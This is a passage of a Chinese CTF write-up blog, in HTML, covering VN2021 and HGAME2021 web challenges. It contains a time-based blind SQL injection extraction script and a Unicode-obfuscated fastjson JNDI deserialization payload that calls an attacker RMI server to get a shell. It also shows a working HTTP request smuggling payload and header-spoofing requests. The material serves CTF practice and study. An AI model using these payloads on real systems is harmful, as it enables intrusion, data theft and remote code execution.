class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>孩子实在跑不下去了</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>登录成功</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>js加载图片</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>抓包看</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>结合应该是fastjson反序列化漏洞</p><h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p><p>服务器起 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>再起监听端口</p><p>最后打payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>服务器加载了恶意class文件，成功getshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p><p>继续学习啦</p><p>（想结识更多大佬）</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2021</title>
      <link href="article/hgame2021/"/>
      <url>article/hgame2021/</url>
      
        <content type="html"><![CDATA[<p>HAME2021-week 个人WP</p><p>昵称：Err0r</p><a id="more"></a><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>这是week1，做了Web和部分Misc，后续会整合成一篇文章(先让我水着)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>由于某些原因，以后会注重原理上的研究</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>题目描述： 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 </p><p>题目地址： <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>抓包看看顺风车啥样</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>状态码405Method Not Allowed</p><p>对于任何客户端请求都要进行一套流程，即DNS解析域名返回IP，打开IP套接字(socket)连接IP，再通过套接字写HTTP数据流，最后从WEB服务器接受响应的HTTP数据流。而405状态码就是最后一步生成的，即服务器不响应这种请求方式，请求方式有GET/POST/HEAD/PUT等，换成POST看看。</p><blockquote><p>注意:在burpsuite里面，右键改变请求方式即可</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>随后提示<code>只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>这里只要改UA就行了，User-Agent 简单来说就是告诉服务器访问者是通过什么工具来请求的，添加<code>Infinite Improbability Drive</code>或者直接删掉UA只加这个也可以</p><p>随后提示</p><pre class="language-none"><code class="language-none">你知道吗？&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;茄子&lt;&#x2F;a&gt;特别要求：你得从他的&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;过来</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>这里是要改Referer，简单来说就是告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理，用法一般是为了防外连接，直接用<code>&lt;a href=&quot;&quot;&gt;</code>，<code>用Submit或&lt;input type=&quot;image&quot;&gt;提交的表单(POST或GET)</code>，或者<code>使用JavaScript提交的[表单](https://baike.baidu.com/item/表单)(POST或GET)</code>都是会带上Referer，当然伪造也很简单。</p><p>最后提示<code>flag仅能通过本地访问获得</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>很简单的XFF，XFF就是表示客户端最原始的IP地址，也是很容易伪造</p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>python脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/6 15:57@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>看着直观点</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>题目描述： 简单且上头的游戏 </p><p>题目地址 ： <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>紧跟潮流的小游戏，作者把源码公开了，所以有很多二创。抢了个一血</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>手快2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>看到小游戏题，第一眼看js，github搜一圈了解到这个游戏的源码在./src/project.js。但是代码四千行，因为游戏开源，所以很容易能找到分析的源码资料，<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">参考链接</a>，直接搜到控制分数的代码，改掉</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>可以看到这一块3436行<code>default.score</code>是计分块，改成+999999保存，然后把游戏玩结束弹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>题目描述： </p><p><strong>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ </p><p>题目链接： <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: 注意留意服务器信息</strong> </p><p>HTTP请求走私，资料里讲的很详细，建议仔细读一下，这里不做过多阐述</p><p>payload：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>题目描述： 又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） </p><p>题目地址： <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>又到了写脚本环节，首先看下题目</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>我大概是假的大学生</p><p>先找题目，全是ax+b的形式，那就挺好办的，找源码看看怎么取数字</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>应该还是挺好取的，但是开始写脚本发现GET请求不到，应该是对接api的，果然在Sources里面找到了个<code>fuckmath.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span 